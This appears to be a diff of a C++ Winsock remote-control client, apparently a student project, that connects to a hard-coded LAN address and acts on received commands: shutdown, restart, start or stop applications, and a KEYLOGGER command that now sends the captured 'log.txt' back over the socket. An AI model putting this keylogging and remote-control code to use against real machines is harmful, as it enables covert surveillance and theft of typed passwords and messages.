@@ -141,6 +141,10 @@
 #include <thread>
 #include<atomic>
 #include "Utility.h"
+// #include "service.cpp"
+#include<sstream>
+#include <locale>
+#include <codecvt>
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -281,6 +285,10 @@ void sendFile(SOCKET clientSocket, const std::string& filePath) {
     std::cout << "File sent successfully. Total bytes sent: " << totalSent << std::endl;
 }
 
+std::wstring stringToWstring(const std::string& str) {
+    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
+    return converter.from_bytes(str);
+}
 
 int main() {
 
@@ -318,7 +326,7 @@ int main() {
 
     sockaddr_in service;
     service.sin_family = AF_INET;
-    InetPton(AF_INET, "127.0.0.1", &service.sin_addr.s_addr);
+    InetPton(AF_INET, "10.122.1.138", &service.sin_addr.s_addr);
     service.sin_port = htons(port);
     if (connect(serverSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR) {
         cout << "Client: connect() - Failed to connect." << endl;
@@ -360,30 +368,53 @@ int main() {
         while (true) {
             // Nhận tin nhắn từ client
             byteCount = recv(serverSocket, buffer, bufferSize, 0);
+
             if (byteCount > 0) {
                 // Đảm bảo chuỗi kết thúc đúng
                 buffer[byteCount] = '\0';
+                string tmp(buffer);
+                vector<string> v;
+                stringstream ss(tmp);
+                string w;
+                while (ss >> w) {
+                    v.push_back(w);
+                }
                 cout << "Message from client: " << buffer << endl;
                 if (strcmp(buffer, "SHUTDOWN") == 0) computer.shutdown();
                 else if (strcmp(buffer, "RESET") == 0) computer.reset();
-                else if (strcmp(buffer, "LISTAPP") == 0) computer.listApp();
-                else if (strcmp(buffer, "STARTAPP") == 0) {
-                    byteCount = recv(serverSocket, buffer, bufferSize, 0);
-                    computer.startApp(buffer);
+                else if (strcmp(buffer, "LISTAPP") == 0) {
+                    computer.listApp();
+                    computer.copyFile(serverSocket, "listApp.txt");
                 }
-                else if (strcmp(buffer, "STOPAPP") == 0) {
-                    computer.stopApp();
-                
-                else if (strcmp(buffer, "LISTSERVICE") == 0) computer.listService();
-                else if(strcmp(buffer, "STARTSERVICE") == 0) computer.startService();
-                else if(strcmp(buffer, "STOPSERVICE") == 0) computer.stopService();
-                else if (strcmp(buffer, "SCREENSHOT") == 0) computer.screenShot();
-                else if (strcmp(buffer, "COPYFILE") == 0) computer.copyFile();
+                else if (v[0] == "STARTAPP") {
+                    computer.startApp(v[1]);
+
+                }
+                else if (v[0] == "STOPAPP") {
+                    computer.stopApp(v[1]);
+                }
+                // else if (strcmp(buffer, "LISTSERVICE") == 0) {
+                //     //std::vector<ServiceManager::ServiceInfo> service = computer.listServices();
+                //     int a;
+
+                // }
+                // else if(v[0] == "STARTSERVICE") {
+                //     std::wstring ws = stringToWstring(v[1]);
+                //     bool ok = computer.startService(ws);
+                // }
+                // else if(strcmp(buffer, "STOPSERVICE") == 0) {
+                //     std::wstring ws = stringToWstring(v[1]);
+                //     computer.stopService(ws);
+                // }
+                //else if (strcmp(buffer, "SCREENSHOT") == 0) computer.screenShot();
+                // else if (v[0] == "COPYFILE") {
+                //     computer.copyFile(serverSocket, v[1]);
+                // }
                 //else if (strcmp(buffer, "STARTWEBCAME") == 0) computer.startWebcame();
                 //else if (strcmp(buffer, "STOPWEBCAME") == 0) computer.stopWebcame();
                 else if (strcmp(buffer, "KEYLOGGER") == 0) {
                     computer.keyLogger(serverSocket);
-
+                    computer.copyFile(serverSocket, "log.txt");
                 }
             }
             else if (byteCount == 0) {
